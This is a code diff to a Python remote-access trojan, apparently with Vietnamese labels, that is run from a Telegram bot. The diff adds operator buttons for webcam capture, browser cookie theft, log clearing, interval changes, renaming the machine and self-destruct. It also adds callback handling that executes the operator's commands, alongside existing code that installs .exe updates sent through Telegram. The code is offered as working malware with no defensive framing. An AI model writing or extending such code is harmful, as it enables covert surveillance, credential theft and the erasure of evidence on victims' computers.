@@ -824,7 +824,27 @@ def execute_command(command, message=None):
     elif cmd in ["/status", "status"]:
         state = load_state()
         machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
-        send_telegram_message(f"<b>✅ Trạng thái [{machine}]</b>\nHoạt động\nThời gian chạy: {datetime.now() - session_start_time}")
+        my_name = machine.lower()
+        inline_kb = {
+            "inline_keyboard": [
+                [
+                    {"text": "📷 Webcam", "callback_data": f"webcam @{my_name}"},
+                    {"text": "🔍 Cookies", "callback_data": f"browser @{my_name}"}
+                ],
+                [
+                    {"text": "🗑️ Xóa logs", "callback_data": f"clear @{my_name}"},
+                    {"text": "⏱️ Intervals", "callback_data": f"interval @{my_name}"}
+                ],
+                [
+                    {"text": "🏷️ Đổi tên", "callback_data": f"name @{my_name}"},
+                    {"text": "💥 Tự hủy", "callback_data": f"destruct @{my_name}"}
+                ]
+            ]
+        }
+        send_telegram_message(
+            f"<b>✅ Trạng thái [{machine}]</b>\nHoạt động\nThời gian chạy: {datetime.now() - session_start_time}",
+            reply_markup=inline_kb
+        )
 
     elif cmd in ["/update", "update"] and message and "document" in message:
         if message["document"]["file_name"].endswith(".exe"):
@@ -906,6 +926,14 @@ def execute_command(command, message=None):
         )
         send_telegram_message(help_text, reply_markup=get_control_keyboard())
 
+def answer_callback_query(callback_query_id):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+        data = {"callback_query_id": callback_query_id}
+        requests.post(url, json=data, timeout=10)
+    except:
+        pass
+
 def poll_telegram():
     state = load_state()
     offset = state.get("telegram_offset", 0)
@@ -916,12 +944,23 @@ def poll_telegram():
             for update in resp.get("result", []):
                 offset = update["update_id"] + 1
                 update_state(telegram_offset=offset)
-                msg = update.get("message", {})
                 
-                if "text" in msg:
-                    execute_command(msg["text"], msg)
-                elif "document" in msg:  # Nhận file
-                    execute_command("/update", msg)
+                if "message" in update:
+                    msg = update["message"]
+                    if "text" in msg:
+                        execute_command(msg["text"], msg)
+                    elif "document" in msg:  # Nhận file
+                        execute_command("/update", msg)
+                elif "callback_query" in update:
+                    cb = update["callback_query"]
+                    cb_id = cb.get("id")
+                    cb_data = cb.get("data", "")
+                    if cb_data:
+                        # Acknowledge the callback immediately
+                        answer_callback_query(cb_id)
+                        # Execute the command from callback data
+                        dummy_msg = cb.get("message", {})
+                        execute_command(cb_data, dummy_msg)
         except Exception as e:
             log_message(f"Error in poll_telegram: {e}")
             time.sleep(5)
